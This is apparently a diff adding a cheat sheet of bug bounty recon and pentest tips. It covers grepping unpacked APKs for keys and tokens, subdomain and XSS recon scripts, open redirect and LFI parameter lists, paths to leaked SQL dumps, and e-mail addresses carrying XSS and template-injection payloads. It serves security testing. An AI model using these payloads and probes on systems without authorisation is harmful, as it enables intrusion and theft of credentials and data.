@@ -1,0 +1,158 @@
+3. Extract information from APK
+
+Here’s a tip to extract interesting (potentially sensitive) information from unpacked APK files (Android App):
+
+grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
+With this one-liner we can identify URLs, API keys, authentication tokens, credentials, certificate pinning code and much more.
+
+Make sure to first unpack the APK file using apktool like this:
+
+$ apktool d app_name.apk
+
+4. Extract zip file remotely
+Did you find a very big zip file accessible on a remote web server and want to inspect its contents, but you don’t want to wait for downloading it? No problem..
+
+$ pip install remotezip
+
+# list contents of a remote zip file
+$ remotezip -l "http://site/bigfile.zip"
+
+# extract file.txt from a remote zip file
+$ remotezip "http://site/bigfile.zip" "file.txt"
+
+. Top 25 open redirect dorks
+Here are the top 25 dorks to find Open Redirect vulnerabilities (aka. “Unvalidated Redirects and Forwards”):
+
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+___
+Finding subdomains
+Here’s a quick and basic recon routine for finding subdomains while doing bug bounty:
+
+#!/bin/bash
+# $1 => example.domain
+
+amass enum --passive -d $1 -o domains_$1
+assetfinder --subs-only $1 | tee -a domains_$1
+
+subfinder -d $1 -o domains_subfinder_$1
+cat domains_subfinder_$1 | tee -a domains_$1
+
+sort -u domains_$1 -o domains_$1
+cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+
+__
+Curl + parallel one-liner
+Here’s a super useful recon one-liner to quickly validate list of hostnames and subdomains:
+
+$ cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
+
+$ apt-get -y install parallel
+__
+Simple XSS check
+Check out this shell script to identify XSS (Cross-Site Scripting) vulnerabilities using a number of open-source tools chained together:
+
+#!/bin/bash
+# $1 => example.domain
+
+subfinder -d $1 -o domains_subfinder_$1
+amass enum --passive -d $1 -o domains_$1
+
+cat domains_subfinder_$1 | tee -a domain_$1
+cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+
+cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
+__
+Find hidden pages on Drupal
+https://target.com/node/1
+https://target.com/node/2
+
+__
+
+Forgotten database dumps
+/back.sql
+/backup.sql
+/accounts.sql
+/backups.sql
+/clients.sql
+/customers.sql
+/data.sql
+/database.sql
+/database.sqlite
+/users.sql
+/db.sql
+/db.sqlite
+/db_backup.sql
+/dbase.sql
+/dbdump.sql
+setup.sql
+sqldump.sql
+/dump.sql
+/mysql.sql
+/sql.sql
+/temp.sql
+
+###E-mail address payloads####
+The following payloads are all valid e-mail addresses that we can use for pentesting of not only web based e-mail systems.
+
+XSS (Cross-Site Scripting):
+
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+Template injection:
+
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+######
+Top 25 local file inclusion (LFI) parameters
+Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities:
+
+?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
